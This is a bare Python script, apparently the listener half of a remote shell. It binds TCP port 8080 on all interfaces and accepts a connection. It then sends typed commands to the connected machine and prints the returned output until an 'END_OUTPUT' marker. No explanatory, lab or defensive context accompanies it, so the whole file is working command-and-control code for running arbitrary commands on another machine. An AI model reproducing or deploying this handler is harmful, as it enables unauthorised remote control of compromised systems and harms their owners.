import socket

s = socket.socket()
s.bind(("0.0.0.0", 8080))
s.listen(1)
print("[*] Listening on 0.0.0.0:8080 ...")
conn, addr = s.accept()
print(f"[+] Connected: {addr}")

while True:
    cmd = input("> ")
    conn.send((cmd+"\n").encode())
    data = b""
    while b"END_OUTPUT" not in data:
        chunk = conn.recv(4096)
        if not chunk:
            break
        data += chunk
    print(data.decode().replace("END_OUTPUT",""))
